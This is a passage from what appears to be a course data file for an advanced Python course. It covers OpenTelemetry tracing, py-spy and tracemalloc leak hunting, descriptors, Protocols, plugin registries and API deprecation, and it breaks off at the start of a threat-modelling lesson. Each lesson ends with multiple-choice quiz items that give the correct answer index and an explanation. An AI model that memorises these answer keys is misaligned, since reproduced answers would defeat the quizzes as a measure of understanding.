One more trap: level filtering happens after argument evaluation. \`log.debug("state=%s", dump_state())\` calls \`dump_state()\` at INFO too, and pays for a dump nobody reads.
      `,
        [
          q('Why does storing the request id in threading.local break once the service runs on asyncio?', [
            'Coroutines run on a background thread that has no local storage',
            'One thread interleaves many requests, so they share the same slot',
            'asyncio starts a fresh thread per task, so the value is never set',
            'The event loop clears thread local storage at every await point',
          ], 1, 'An event loop multiplexes thousands of concurrent requests onto one thread, so a thread local value is visible to all of them, while a ContextVar follows the individual task.'),
          q('A service keeps 1% of log lines by rolling a random number per line. An engineer opens one failed checkout. What do they see?', [
            'Nothing at all, because sampling always drops whole requests first',
            'Every line, since error level records are exempt from sampling',
            'Duplicate lines, because the sampler retries the ones it dropped',
            'A few scattered lines with most of the story missing between them',
          ], 3, 'Sampling per line keeps a random 1% of each request rather than 1% of complete requests, so no single request is ever intact enough to follow.'),
          q('Which change cuts log volume while keeping a failed checkout debuggable?', [
            'Keep every line for sampled requests and for all warnings and errors',
            'Cut the retention window for every log line down to twelve hours',
            'Drop all fields except the message so that each line is smaller',
            'Log at DEBUG but write the lines only once the request has finished',
          ], 0, 'Deciding once per request keeps whole stories rather than fragments, and letting warnings and errors through unconditionally means every failure survives the sampler.'),
        ]
      ),
      lesson('Metrics and Distributed Tracing with OpenTelemetry', 14, `
Checkout p99 went from 210 ms to 640 ms overnight. Every dependency dashboard is green: the database says 4 ms, the pricing service says 30 ms, the cache says under a millisecond. Everything is fast and the request is slow, which means the time is in the gaps nobody instrumented.

### Three signals answer three different questions

| Signal | Question it answers | Cardinality budget |
|---|---|---|
| Metrics | is it broken, and by how much, right now | low, tens of series per metric |
| Traces | where did the time go inside one request | one id per request, sampled |
| Logs | what exactly happened at this step | high, whatever you can afford |

Reaching for the wrong one is expensive. A metric per user is a database outage; a trace search to count errors is a bad afternoon.

### Latency is a histogram, never an average

\`\`\`python
from opentelemetry import metrics

meter = metrics.get_meter("checkout")
duration = meter.create_histogram("checkout.duration", unit="ms")
failures = meter.create_counter("checkout.failures")

duration.record(elapsed_ms, {"step": "payment", "outcome": "ok"})
failures.add(1, {"reason": "card_declined"})
\`\`\`

A mean over 12,000 requests is dominated by the 11,900 fast ones. If 300 requests take four seconds, the mean moves by 90 ms and nobody notices. The p99 doubles. Record a histogram and read percentiles from the buckets, remembering the value you get back is an estimate bounded by bucket edges: with an edge at 500 ms and the next at 1000 ms, a true p99 of 620 ms reports somewhere in that range.

Counters and histograms also survive restarts and replicas correctly. A gauge averaged across eight pods is a number with no meaning.

### The cardinality bomb

Series count is the product of attribute cardinalities. Eight endpoints times five status codes is 40 series, which is nothing. Add \`user_id\` with two million distinct values and you have asked your metrics backend to hold 80 million series. It will slow down, then fall over, and the fix requires deleting data. User ids belong in logs and span attributes, never on a metric.

### A span tree shows the gap

\`\`\`python
from opentelemetry import trace

tracer = trace.get_tracer("checkout")

with tracer.start_as_current_span("checkout") as span:
    span.set_attribute("user.plan", user.plan)
    with tracer.start_as_current_span("price_cart"):
        total = price_cart(cart)
    with tracer.start_as_current_span("charge"):
        charge(total)
\`\`\`

The waterfall for one slow request:

\`\`\`text
checkout                          642 ms
  price_cart                      598 ms
    db.select order_items           7 ms   x 47 sequential calls
  charge                           31 ms
\`\`\`

Forty seven sequential 7 ms queries. No single dependency looked slow, because none of them were: the shape of the calls was the bug. That is the classic N+1, and only a trace makes it visible.

### Propagation is one header

Context crosses a service boundary as \`traceparent\`:

\`\`\`text
traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01
             ^^ ^ trace id                       ^ parent span id   ^ sampled flag
\`\`\`

Install the auto instrumentation for your client and server and this is injected and read for you:

\`\`\`bash
pip install opentelemetry-instrumentation-httpx opentelemetry-instrumentation-fastapi
opentelemetry-instrument --traces_exporter otlp python -m myapp.main
\`\`\`

Two things to get right. Sample with a parent based sampler, so a request is either traced end to end or not at all, exactly like the request level log sampling from the previous topic. And put \`trace_id\` in every log record, because the payoff is clicking from the 640 ms span straight to the log lines it produced.
      `,
        [
          q('Checkout latency is exported as a gauge holding the mean for each minute. Why does a p99 regression stay invisible on it?', [
            'Gauges are scraped once a minute, so most requests are never recorded',
            'The mean is computed in the collector, which discards slow outliers',
            'A mean over thousands of requests hides a slow tail of a few hundred',
            'Gauges cannot be summed across replicas, so the exported value is wrong',
          ], 2, 'A few hundred four second requests move the mean by tens of milliseconds while moving the 99th percentile enormously, so only a histogram exposes the tail.'),
          q('A counter already carries 8 endpoint values and 5 status codes. Someone adds user_id, which has two million distinct values. What is the result?', [
            'The counter stops incrementing as soon as the attribute set changes',
            'Series count multiplies by every distinct user and storage collapses',
            'OpenTelemetry rejects the attribute because its cardinality is too high',
            'Each user receives a separate counter that resets on every export',
          ], 1, 'Time series are created per unique attribute combination, so multiplying 40 series by two million user ids asks the backend to hold 80 million series.'),
          q('A trace shows a 642 ms request whose child spans are 47 sequential database queries of about 7 ms each. What is the fix?', [
            'Enlarge the connection pool so that the 47 queries run in parallel',
            'Raise the sampling ratio so the slow trace is captured more often',
            'Move the pricing work to a background task and return immediately',
            'Fetch the rows in one query instead of issuing one query per row',
          ], 3, 'No individual query is slow, so the cost is the number of round trips, and collapsing the N+1 pattern into a single query removes 46 of them.'),
        ]
      ),
      lesson('Live Diagnosis: py-spy, tracemalloc, and Memory Leaks', 14, `
A worker's resident memory climbs about 40 MB an hour. The container limit is 2 GB, so roughly every fourteen hours the kernel OOM kills it, Kubernetes restarts it, and the graph resets. There is no exception, no traceback, nothing in the logs. Locally it runs for days without moving.

### Attach to the process that is already broken

Chapter 6 used \`cProfile\`, which needs you to start the process under it. That is no help when the interesting process is already running and you cannot restart it without destroying the evidence. \`py-spy\` reads another process's memory from outside:

\`\`\`bash
py-spy dump --pid 4711                  # every thread's stack, right now
py-spy top --pid 4711                   # live top-like view of hot functions
py-spy record -o flame.svg --pid 4711 --duration 60
\`\`\`

No import, no restart, and the target keeps serving. Inside Docker it needs \`--cap-add SYS_PTRACE\`; from a sidecar it also needs \`shareProcessNamespace: true\`. When a worker hangs, \`py-spy dump\` typically ends the investigation in one command: you see all eight threads parked in \`socket.recv\` on a call that has no timeout.

### tracemalloc compares, it does not accuse

An absolute snapshot tells you where memory is, which is almost always "the code that legitimately holds data". Growth is what you want:

\`\`\`python
import tracemalloc

tracemalloc.start(25)                       # keep 25 frames per allocation
baseline = tracemalloc.take_snapshot()

for _ in range(1000):
    handle_job(next_job())

current = tracemalloc.take_snapshot()
for stat in current.compare_to(baseline, "lineno")[:10]:
    print(stat)
\`\`\`

\`\`\`text
/app/src/reporting/cache.py:41: size=612 MiB (+610 MiB), count=8022 (+8000)
/app/src/orders/api.py:88:     size=1.2 MiB (+0.1 MiB), count=310 (+12)
\`\`\`

One line, 8,000 objects that arrived and never left. That is your leak. Note \`tracemalloc.start(25)\`: the default of 1 frame tells you the allocation happened inside \`list.append\`, which you already knew.

### RSS and the Python heap are two different numbers

| Symptom | Likely cause |
|---|---|
| tracemalloc grows, RSS grows | ordinary Python leak, follow the diff |
| tracemalloc flat, RSS grows | C extension, or freed memory not returned to the OS |
| Both flat, container still killed | another process in the pod, or page cache accounting |

Freed Python objects go back to pymalloc's arenas, and an arena is only released when it is completely empty. Load a 400 MB list, free it, and RSS can stay high because a handful of surviving objects are scattered across the arenas. That is fragmentation, not a leak, and no amount of \`gc.collect()\` fixes it.

### The leak that is a traceback

\`\`\`python
class ErrorBuffer:
    def __init__(self):
        self.recent = []

    def record(self, exc: Exception) -> None:
        self.recent.append(exc)          # for the /debug/errors endpoint
\`\`\`

Innocent looking, and it is why the worker dies. An exception object holds \`__traceback__\`, which holds every frame, which holds every local in those frames. One failed report keeps the 30 MB DataFrame that was being processed alive forever. Store the rendering, not the object:

\`\`\`python
    def record(self, exc: Exception) -> None:
        self.recent.append("".join(traceback.format_exception(exc))[:4000])
        del self.recent[:-100]
\`\`\`

This is also why \`except Exception as err:\` deletes \`err\` at the end of the block: Python is protecting you from exactly this. The same trap appears with \`lru_cache(maxsize=None)\`, module level dicts keyed by user id, and threads that are started and never joined. When you are unsure which type is piling up, \`objgraph.show_growth()\` between two batches names it in one line.
      `,
        [
          q('A production worker is stuck and must not be restarted. Why can py-spy get a stack out of it when cProfile cannot?', [
            'It attaches to a running pid and reads its memory, needing no restart',
            'It runs inside the same process, so it sees interpreter state directly',
            'It installs sys.settrace at import time, so every frame is recorded',
            'It replays the process from its last checkpoint on a spare core',
          ], 0, 'py-spy is an external sampler that reads the target process memory by pid, so the process keeps running untouched and no instrumentation had to be enabled beforehand.'),
          q('tracemalloc reports the tracked heap flat at 180 MB while resident memory climbs past 900 MB. What does that combination point at?', [
            'A Python list that tracemalloc silently stopped tracking after startup',
            'A miscount, because tracemalloc was started after the leak had begun',
            'Allocations outside Python, such as a C extension or fragmented arenas',
            'The garbage collector holding cycles that it has not yet scheduled',
          ], 2, 'tracemalloc only sees allocations made through the Python allocator, so growth it cannot account for is coming from native code or from arenas that were never returned to the operating system.'),
          q('An endpoint keeps the last 100 exception objects in a list so support can read recent errors. Why does memory grow without limit?', [
            'Exception objects are never collected, because they live in sys.modules',
            'Each one holds a traceback, whose frames keep every local alive',
            'The list is module level, so the collector skips it on every pass',
            'Formatting an exception copies all of its frames into a second buffer',
          ], 1, 'An exception references its traceback, the traceback references each frame, and each frame references its locals, so one stored exception can pin a large DataFrame in memory forever.'),
        ]
      ),
      ],
      [
      q('A single request took 640 ms and you have metrics, logs and traces for it. Which signal tells you which of its eleven calls spent the time?', [
        'A counter of requests per endpoint, broken down by status code',
        'A log line written when the request finished, with total duration',
        'A histogram of request latency, read at the 99th percentile',
        'The span tree for that request, with every child span timed',
      ], 3, 'Metrics aggregate across requests and a single log line gives only the total, while a span tree breaks one request into timed children and exposes the gap.'),
      q('What does a correlation id buy that justifies threading it through middleware and outbound headers?', [
        'It joins the log lines, the trace and downstream calls of one request',
        'It lets the collector discard duplicate lines produced by retries',
        'It removes the need for structured fields on each log record',
        'It guarantees the retry is routed back to the same service replica',
      ], 0, 'Without a shared key the lines from several services are unlinkable, and the id is what turns scattered records into one searchable story for a single request.'),
      q('A worker hangs at 03:00 with no traceback and no CPU use. Which pair of tools actually produces an answer?', [
        'cProfile output from the last clean run, plus a chart of mean latency',
        'py-spy dump against the pid, plus faulthandler dumping stacks on a signal',
        'tracemalloc snapshots compared, plus a counter of jobs processed so far',
        'A pdb post mortem on the crash dump, plus a p99 latency histogram',
      ], 1, 'A hang produces no exception and no memory growth, so the useful question is what every thread is executing right now, which both of those tools answer on a live process.'),
      q('Which change makes a production failure debuggable without altering what the code does?', [
        'Catch the exception at the boundary and log str(err) at error level',
        'Sample lines at 1% so the aggregator can afford a longer retention window',
        'Log with exception(), attach the trace id, and keep notes on the error',
        'Shorten the metric scrape interval so gauges are recorded more often',
      ], 2, 'Those three additions preserve the traceback, the values known at the raise site and the link to the trace, which together turn a one line report into a specific line of code.'),
      ]
    ),
    chapter(
      'Metaprogramming and Extensible APIs',
      'The attribute and class machinery frameworks are built from, and how to expose it as an API other teams extend without you breaking them.',
      [
      lesson('Attribute Access: Properties, Descriptors, and __slots__', 14, `
Two million \`Course\` objects with three fields each cost about 300 MB on CPython 3.12. Give the class \`__slots__\` and the same two million cost about 130 MB. Same fields, same code, 170 MB back.

That difference, and every validation hook you have ever written, come from one fact: reading \`course.hours\` is a method call, not a memory read.

### The lookup order decides everything

Evaluating \`course.hours\` runs \`type(course).__getattribute__\`, which walks a fixed order:

| Step | Where it looks | Beats |
|---|---|---|
| 1 | Data descriptor on the class or its MRO | everything below |
| 2 | The instance \`__dict__\` | plain class attributes |
| 3 | Non data descriptor or plain class attribute | nothing |
| 4 | \`__getattr__\`, only if 1 to 3 all failed | the \`AttributeError\` |

A **descriptor** is any object defining \`__get__\`. If it also defines \`__set__\` or \`__delete__\` it is a *data* descriptor, and it outranks the instance dictionary. That single ranking is why \`@property\` cannot be clobbered by \`self.hours = 5\`, and why a plain method, which is a non data descriptor, absolutely can be.

### One descriptor instead of the fifth property

Five properties that all check "must be positive" are five copies of the same six lines. A descriptor is one copy:

\`\`\`python
class Positive:
    def __set_name__(self, owner, name):
        self.name = name                    # "hours", captured at class creation

    def __get__(self, obj, objtype=None):
        if obj is None:
            return self                     # Course.hours, not an instance
        return obj.__dict__[self.name]

    def __set__(self, obj, value):
        if value <= 0:
            raise ValueError(f"{self.name} must be positive, got {value}")
        obj.__dict__[self.name] = value


class Course:
    hours = Positive()
    price = Positive()

    def __init__(self, hours, price):
        self.hours = hours
        self.price = price

Course(20, 149.0)
Course(0, 149.0)        # ValueError: hours must be positive, got 0
\`\`\`

The bug shipped here again and again is storing the value on the descriptor:

\`\`\`python
    def __set__(self, obj, value):
        self._value = value     # broken: one descriptor object per class attribute
\`\`\`

The descriptor is a class attribute, so exactly one of it exists for every instance ever created. Set \`hours\` on one course and every other course sees it change. A test with a single object passes. A request handler holding a list of them does not. Per object state belongs on \`obj\`, keyed by the name \`__set_name__\` handed you.

### \`__getattr__\` is a fallback, not a hook

\`__getattr__\` runs only after normal lookup has already failed, which makes it the cheap way to build a lazy proxy or a config object. It is also where people quietly break their own objects:

\`\`\`python
class Config:
    def __getattr__(self, name):
        return self._data.get(name)     # returns None for literally any name
\`\`\`

Now \`hasattr(cfg, "anything")\` is True, \`copy.copy(cfg)\` asks for \`__copy__\`, receives \`None\`, and fails somewhere unrelated, and pickling goes the same way. Raise \`AttributeError\` for every name you do not own, dunders included.

### \`__slots__\` and the row that erases the saving

\`\`\`python
class Course:
    __slots__ = ("slug", "hours", "price")
\`\`\`

Slots swap the per instance dictionary for a fixed array, with one descriptor per name generated for you.

| | dict based | with \`__slots__\` |
|---|---|---|
| Per instance bytes, 3 fields, 3.12 | about 152 | about 64 |
| Assigning an unlisted attribute | works | \`AttributeError\` |
| \`weakref.ref(obj)\` | works | needs \`"__weakref__"\` listed |
| Subclass that omits \`__slots__\` | not applicable | silently regains a \`__dict__\` |

That last row costs you the whole saving without printing a single warning, and it is why a slots migration so often measures as no change at all. For dataclasses, ask for it directly with \`@dataclass(slots=True)\`. One more sharp edge: a slot name that collides with a class attribute or property of the same name raises \`ValueError: 'hours' in __slots__ conflicts with class variable\` while the class is being created.
      `,
        [
          q('A class defines hours as a property, and __init__ runs self.hours = 20. Where does that 20 actually go?', [
            'Into the instance __dict__ under hours, shadowing the property',
            'Nowhere, because defining a property makes the name read only',
            'Wherever the setter puts it, since a data descriptor outranks the instance dict',
            'Into the class __dict__, replacing the property object itself',
          ], 2, 'A property defines __set__, which makes it a data descriptor, so it intercepts the assignment before the instance dictionary is ever consulted.'),
          q('A Positive descriptor stores the assigned value as self._value inside __set__. What goes wrong?', [
            'Every instance of the class shares one value, so the last write wins',
            'The value disappears as soon as the instance is garbage collected',
            '__get__ starts returning the descriptor object instead of the value',
            'The second instance created raises RecursionError on assignment',
          ], 0, 'The descriptor is a single class attribute shared by every instance, so per object state must be stored on the object itself rather than on the descriptor.'),
          q('You add __slots__ to Course and the service that creates millions of them uses just as much memory. What is the likely cause?', [
            '__slots__ only saves memory on classes with more than eight fields',
            'The tuple has to list __dict__ first before the interpreter honours it',
            'Slots are ignored unless the class also defines its own __init__',
            'A subclass omits __slots__, so its instances get a dictionary back',
          ], 3, 'A subclass without its own __slots__ declaration regains a per instance __dict__, which silently restores the overhead the parent class removed.'),
        ]
      ),
      lesson('Protocols, ABCs, and Generics for Extensible Types', 14, `
You publish \`Storage\` as an abstract base class. Three implementations live in your repository, one lives in a customer's. In 2.3 you add \`list_keys\` to the ABC, and their build dies with \`TypeError: Can't instantiate abstract class S3Storage with abstract method list_keys\`. You never touched their code. Inheritance did it for you.

### Nominal versus structural

| | ABC | Protocol |
|---|---|---|
| How a class qualifies | inherits from it | has matching members |
| Checked by | the runtime, at instantiation | the type checker |
| Implementer imports your package | yes | no |
| Adding a required member | breaks every subclass | breaks nothing until they upgrade the checker |

The rule that follows: **types you accept are Protocols, types you provide can be ABCs.**

\`\`\`python
from typing import Protocol

class Storage(Protocol):
    def read(self, key: str) -> bytes: ...
    def write(self, key: str, blob: bytes) -> None: ...

def restore(store: Storage, key: str) -> Config:
    return parse_config(store.read(key))
\`\`\`

Any object with those two methods satisfies \`Storage\`. A test double built in twelve lines qualifies without importing anything from you, and so does the customer's \`S3Storage\` written before your package existed.

An ABC still earns its place when you are shipping real shared behaviour: a template method that calls two hooks, a \`__init__\` that does the boring half, and a hard runtime failure when a required hook is missing. Just remember that every \`@abstractmethod\` you add later is a major version change.

### \`runtime_checkable\` checks less than you think

\`\`\`python
from typing import runtime_checkable

@runtime_checkable
class Storage(Protocol):
    def read(self, key: str) -> bytes: ...

isinstance(FakeStore(), Storage)     # True if the name exists, that is all
\`\`\`

It checks that the attributes are present. It does not check signatures, so a \`def read(self)\` taking no key passes \`isinstance\` and then raises \`TypeError\` at the call. \`issubclass\` against a protocol with non method members refuses outright with a \`TypeError\`. Treat it as a coarse guard at a boundary, never as validation.

### Generics carry the element type through

\`\`\`python
class Repository[T]:
    def __init__(self, model: type[T]) -> None:
        self.model = model

    def get(self, pk: int) -> T | None: ...

courses = Repository(Course)
lesson = courses.get(7)      # Course | None, not Any
\`\`\`

That bracket syntax is Python 3.12 and later; earlier code declares a \`TypeVar\` and inherits from \`Generic[T]\` for the same result. The payoff is that one class serves every model while callers keep concrete types instead of \`Any\` spreading through their code.

### The variance error everyone hits once

\`\`\`python
def total_minutes(items: list[Lesson]) -> int: ...

quizzes: list[Quiz] = load_quizzes()      # Quiz subclasses Lesson
total_minutes(quizzes)
# error: Argument 1 has incompatible type "list[Quiz]"; expected "list[Lesson]"
\`\`\`

The checker is right, and the reason is not pedantry. \`total_minutes\` receives a mutable list typed as \`list[Lesson]\`, so it is entitled to append a plain \`Lesson\`, and the caller would be left holding a \`list[Quiz]\` containing something that is not a \`Quiz\`. Mutable containers are invariant for that reason. Annotate the parameter \`Sequence[Lesson]\`, which is read only and covariant, and the call type checks with no change at the call site.

### \`Self\` for anything chainable

\`\`\`python
from typing import Self

class Query:
    def where(self, **conditions) -> Self:
        ...
        return self
\`\`\`

Annotating that \`-> Query\` looks harmless and quietly breaks subclasses: \`AdminQuery().where(active=True)\` is then typed \`Query\`, and the next admin only method in the chain is an error. \`Self\` follows whatever class the call was made on, which is the same reason \`@classmethod\` constructors work for subclasses.
      `,
        [
          q('You add an @abstractmethod to a published ABC in a minor release. What happens to a customer subclass that does not define it?', [
            'It keeps working, and the missing method raises NotImplementedError',
            'It raises TypeError at instantiation, so the release was breaking',
            'Only static type checking fails, and the running code is unaffected',
            'The abstract method is inherited as a no op that returns None',
          ], 1, 'An ABC refuses to instantiate any class with an unimplemented abstract method, so adding one breaks existing subclasses at runtime and belongs in a major version.'),
          q('Why does a checker reject passing a list[Quiz] to a parameter annotated list[Lesson] when Quiz subclasses Lesson?', [
            'Type parameters are only checked on the built in container types',
            'Subclass relationships are always ignored inside generic types',
            'list is declared covariant, and covariance forbids subclass elements',
            'The function could append a plain Lesson and corrupt the caller\'s list',
          ], 3, 'A mutable container is invariant because writing through the parameter would leave the caller holding a list whose declared element type is no longer true.'),
          q('Storage is a runtime_checkable Protocol requiring read(self, key). isinstance(store, Storage) is True, yet store.read("config.json") raises TypeError. How?', [
            'isinstance only checks that the attribute names exist, never signatures',
            'runtime_checkable protocols skip any method inherited from a base class',
            'The protocol object was created before read was added to the class',
            'isinstance compares signatures but treats every argument as optional',
          ], 0, 'A runtime_checkable protocol verifies the presence of members and nothing else, so a method with the wrong parameters passes the check and fails at the call.'),
        ]
      ),
      lesson('__init_subclass__, Metaclasses, and Plugin Registries', 13, `
Your exporter registry works perfectly in the test suite and returns an empty dict in the CLI. The decorator is fine. Nobody imported \`exporters/parquet.py\`, so it never ran. Registration in Python happens at import time, and a plugin nobody imports does not exist.

### The base class that registers its own subclasses

\`\`\`python
class Exporter:
    registry: dict[str, type["Exporter"]] = {}

    def __init_subclass__(cls, /, format=None, **kwargs):
        super().__init_subclass__(**kwargs)
        if format is None:
            raise TypeError(f"{cls.__name__} must declare format=...")
        if format in Exporter.registry:
            other = Exporter.registry[format].__name__
            raise ValueError(f"format {format!r} already claimed by {other}")
        cls.format = format
        Exporter.registry[format] = cls

    def dump(self, rows) -> bytes:
        raise NotImplementedError


class CsvExporter(Exporter, format="csv"):
    def dump(self, rows) -> bytes: ...
\`\`\`

\`__init_subclass__\` is defined on the parent, runs once per subclass, and receives the new class after its body has executed but before the name is bound in the module. It is implicitly a classmethod, so the decorator is not needed and adding it is a common mistake. The other one is dropping \`**kwargs\` and the \`super()\` call: as soon as somebody mixes your base with another that takes its own class keywords, the arguments have nowhere to go and class creation fails with a \`TypeError\` pointing at code the user did not write.

Notice what the hook buys beyond registration. A typo in \`format\` fails at import, on the line defining the class, rather than at 3am when someone runs \`--format csv\` and gets a \`KeyError\`.

### Metaclasses, and the bill they send your users

A metaclass is the class of a class. \`class Exporter(metaclass=M)\` calls \`M(name, bases, namespace)\` instead of \`type(...)\`, so it can rewrite the namespace before the class exists, control the mapping the body executes in through \`__prepare__\`, and give the class object itself behaviour such as \`len(Exporter)\` or a custom \`isinstance\`. \`Enum\` and \`ABCMeta\` genuinely need that.

| Need | Reach for |
|---|---|
| Register or validate each subclass | \`__init_subclass__\` |
| Register one specific class | a class decorator |
| Change the namespace before the class exists | metaclass \`__new__\` or \`__prepare__\` |
| Make the class object itself iterable or callable oddly | metaclass |

The bill arrives when a user combines your class with somebody else's:

\`\`\`python
class Thing(YourPlugin, SomeABC): ...
# TypeError: metaclass conflict: the metaclass of a derived class must be a
# (non-strict) subclass of the metaclasses of all its bases
\`\`\`

They cannot fix that without editing your library or the other one. \`__init_subclass__\` never causes it, which is why it should be the default answer and a metaclass the exception you can justify.

### Discovery without an import

Entry points let a separately installed distribution announce itself:

\`\`\`toml
[project.entry-points."cortexis.exporters"]
parquet = "cortexis_parquet:ParquetExporter"
\`\`\`

\`\`\`python
from importlib.metadata import entry_points

for ep in entry_points(group="cortexis.exporters"):
    try:
        Exporter.registry[ep.name] = ep.load()
    except Exception:
        log.exception("exporter plugin %s failed to load", ep.name)
\`\`\`

Two things to know. The selection API changed: \`entry_points()\` returned a dict of groups on older versions, and that interface was removed in 3.12, so always pass \`group=\`. And \`ep.load()\` imports third party code inside your process, which is why the \`try\` is not optional: one broken plugin should degrade one format, not take down the whole CLI. If a dozen plugins are installed, load each one on first use instead of at startup, or your import time becomes their import time.
      `,
        [
          q('Your registry decorator adds each exporter to a dict, and the dict is empty when the CLI runs. What explains it?', [
            'Decorators run lazily, on the first call to the decorated class',
            'Each import of the module rebinds the registry to a fresh dict',
            'Class decorators only run under python -m, not from a console script',
            'The modules defining those exporters were never imported, so nothing ran',
          ], 3, 'Registration happens as a side effect of class creation at import time, so a plugin module that is never imported never adds itself to the registry.'),
          q('Why prefer __init_subclass__ over a metaclass for a plugin base class other people inherit from?', [
            'It runs once per instance, so a registration can never be missed',
            'A metaclass can collide with another base\'s metaclass and break users',
            'A metaclass cannot see the subclass name or its namespace contents',
            'Only __init_subclass__ is allowed to reject a subclass by raising',
          ], 1, 'Combining two bases with unrelated metaclasses raises a metaclass conflict that users cannot fix themselves, and __init_subclass__ never introduces that problem.'),
          q('A base defines def __init_subclass__(cls, *, format) and a user writes class S3Exporter(Exporter, format=\'s3\', region=\'eu\'). What happens?', [
            'region is attached to the class automatically alongside format',
            'The class is created normally and region is silently discarded',
            'TypeError, because the extra class keyword has nowhere to go',
            'region is forwarded to __init__ whenever an instance is created',
          ], 2, 'Keyword arguments in a class statement are passed straight to __init_subclass__, so any keyword it neither accepts nor forwards through **kwargs is an error at class creation.'),
        ]
      ),
      lesson('Designing a Public API and Deprecating It Safely', 13, `
You added a \`DeprecationWarning\` to \`Client.fetch_all\` in 2.4, gave everyone nine months, and deleted it in 3.0. Support fills with people saying they were never warned. They are telling the truth. Python's default filters hide \`DeprecationWarning\` everywhere except code running in \`__main__\`, so a warning raised inside a library, called from a framework, called from a web server, is printed to nobody.

### A warning that reaches the person who can act on it

\`\`\`python
import warnings

def fetch_all(self, *, limit=100):
    warnings.warn(
        "Client.fetch_all is deprecated since 2.4 and removed in 4.0; "
        "use Client.iter_courses() instead",
        DeprecationWarning,
        stacklevel=2,
    )
\`\`\`

The default \`stacklevel=1\` blames the line inside your own module, so the user sees a file path in site-packages and no idea which of their calls caused it. \`stacklevel=2\` points at the caller. Say three things every time: since when, when it disappears, what replaces it.

Then make the warning visible where it matters. \`pytest\` shows deprecations by default, and users can opt in with \`PYTHONWARNINGS=default::DeprecationWarning\`. In your own suite, go further:

\`\`\`toml
[tool.pytest.ini_options]
filterwarnings = ["error::DeprecationWarning"]
\`\`\`

That turns your own internal calls to the deprecated path into test failures, which is how you discover you are still using it in six places you forgot about.

On 3.13 and later the decorator does both jobs at once:

\`\`\`python
from warnings import deprecated

@deprecated("use Client.iter_courses() instead")
def fetch_all(self, *, limit=100): ...
\`\`\`

It emits the runtime warning and marks the function so type checkers flag every caller in their editor, before anything runs. \`typing_extensions.deprecated\` backports it.

### Public is what you documented, and that includes the import path

A leading underscore and a curated \`__all__\` say what you support. So does location: moving \`cortexis.client.Client\` to \`cortexis.http.Client\` breaks \`from cortexis.client import Client\` even though the class itself never changed. Keep the old path breathing with a module level \`__getattr__\`:

\`\`\`python
# cortexis/client.py
def __getattr__(name):
    if name == "Client":
        warnings.warn(
            "cortexis.client.Client moved to cortexis.http.Client",
            DeprecationWarning, stacklevel=2,
        )
        from .http import Client
        return Client
    raise AttributeError(name)
\`\`\`

Same fallback rule as instance attributes: it fires only when the normal lookup fails, so nothing else in the module slows down.

### Design choices that spare you the deprecation entirely

\`\`\`python
def search(query: str, *, limit: int = 20, offset: int = 0) -> SearchResult: ...
\`\`\`

Everything before the \`*\` is frozen forever: the order and the names are both API, because somebody passes them positionally and somebody else passes them by keyword. Everything after it can be added, renamed and reordered freely. The star costs nothing today and buys years of freedom.

The same logic applies to return values. \`return rows, total\` reads nicely until you need \`elapsed_ms\`, and appending it breaks every \`rows, total = search(...)\` on the planet at once. Return a small dataclass and new fields are additive.

### The timeline

| Release | What happens |
|---|---|
| 2.4 | New API ships, old one warns, docs point at the replacement |
| 2.5 onward | Both work, warning stays, your own calls migrate |
| 4.0 | Old API removed, changelog names the replacement |

Two minor releases is the minimum, and removal only ever happens on a major bump. Chapter 7 covers which number to move; this is what has to happen before you are allowed to move it.
      `,
        [
          q('You deprecated a method nine months ago with warnings.warn and DeprecationWarning, and users insist they never saw it. Why not?', [
            'Python\'s default filters hide DeprecationWarning outside __main__',
            'Each warning is emitted only once per process, per calling line',
            'warnings.warn prints nothing at all unless stacklevel is set to 2',
            'DeprecationWarning is suppressed whenever the -O flag is not passed',
          ], 0, 'The default warning filters ignore DeprecationWarning raised anywhere except __main__, so library deprecations reach nobody until a filter or PYTHONWARNINGS turns them on.'),
          q('What does stacklevel=2 change about a deprecation warning raised inside your library?', [
            'It raises the warning as an error after the second occurrence',
            'It prints two frames of the stack instead of only the innermost',
            'It reports the caller\'s line rather than the line inside your module',
            'It escalates the warning so the default filters cannot hide it',
          ], 2, 'stacklevel walks up the call stack when attributing the warning, so 2 points at the user\'s own call site, which is the only line they can actually change.'),
          q('Your function returns the tuple (rows, total) and you now need to report elapsed_ms as well. What is the compatible move?', [
            'Append it to the tuple, since unpacking ignores any extra values',
            'Return a dataclass now and deprecate the tuple over two releases',
            'Add a keyword argument that switches the third element on and off',
            'Return a dict instead, because callers can unpack that the same way',
          ], 1, 'Adding an element breaks every rows, total = search(...) at once, so the safe path is a new return type introduced alongside a warning and the tuple removed only at a major version.'),
        ]
      ),
      ],
      [
      q('Which of these wins when Python resolves obj.hours and more than one candidate exists?', [
        'A __getattr__ method defined on the class',
        'A plain class attribute with the same name',
        'An ordinary method with the same name on the class',
        'A descriptor defining both __get__ and __set__',
      ], 3, 'Data descriptors are consulted before the instance dictionary, which is why a property cannot be overwritten by assigning to the instance.'),
      q('You want third party classes to satisfy your interface without importing anything from your package. What do you publish?', [
        'A Protocol, which is satisfied structurally by matching members',
        'An ABC, whose abstract methods are enforced at instantiation',
        'A metaclass that registers every class defining those methods',
        'A base class raising NotImplementedError in every method body',
      ], 0, 'A Protocol is structural, so any class with matching methods qualifies without inheriting from you or importing your package at all.'),
      q('Why does a registry built on __init_subclass__ still miss plugins that ship as separate installed packages?', [
        'Subclasses in another package each get their own copy of the registry',
        'The hook only runs when the module defining the subclass is imported',
        '__init_subclass__ cannot see classes defined outside its own package',
        'Entry point discovery replaces the registry and clears it at startup',
      ], 1, 'Class creation is an import time event, so a plugin module nobody imports never registers, which is exactly the gap entry point discovery fills.'),
      q('Which change to a published function can ship in a minor release without breaking existing callers?', [
        'Renaming a positional parameter that some callers pass by keyword',
        'Adding a fourth element to the tuple that the function returns',
        'Adding a keyword only parameter that has a sensible default',
        'Moving the function to a new module and removing the old path',
      ], 2, 'A keyword only parameter with a default is invisible to every existing call site, while renames, longer tuples and moved import paths all break code that works today.'),
      ]
    ),
    chapter(
      'Untrusted Input, Dependencies, and Hardening',
      'Treating every input and every third party package as hostile, and hardening a Python service that real attackers will reach.',
      [
      lesson('Threat Modelling a Python Service', 13, `
A reporting service at a logistics company had no login because it was "internal". It served \`/reports/{report_id}\`, integers, sequential. A contractor with a valid session for their own account edited the number in the URL and pulled 41,000 shipment manifests belonging to other customers. No exploit kit, no CVE, no payload. One integer.

Threat modelling is the hour you spend before that happens, and what it produces is a ranked list, not a feeling.

### Four questions, in this order

What are you building? What can go wrong? What will you do about it? Did you actually do it? Most teams answer the second question, write a wiki page, and never reach the fourth. A threat model that does not end in tickets and a test is documentation, not security.

### Draw data, not boxes

